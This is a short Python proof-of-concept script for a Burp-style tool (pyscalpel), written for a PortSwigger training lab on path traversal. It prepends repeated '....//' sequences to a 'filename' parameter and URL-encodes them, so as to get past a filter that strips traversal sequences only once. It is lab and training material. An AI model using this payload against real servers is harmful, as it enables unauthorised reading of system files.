from pyscalpel.http import Request, Response
from pyscalpel.utils import to_bytes, get_param, urldecode, urlencode_all, update_param

# POC script for path traversal exploitation
# -> https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

param_name = "filename"

prefix = b"....//" * 500


def req_edit_in(req: Request) -> bytes | None:
    param = get_param(req, param_name)
    if param is not None:
        text_bytes = str.encode(param.value())
        return urldecode(text_bytes).removeprefix(prefix)


def req_edit_out(req: Request, text: bytes) -> bytes | None:
    encoded = urlencode_all(prefix + text)
    str_encoded = str(encoded, "ascii")
    new_req = update_param(req, param_name, str_encoded)
    req_bytes = new_req.to_bytes()
    return req_bytes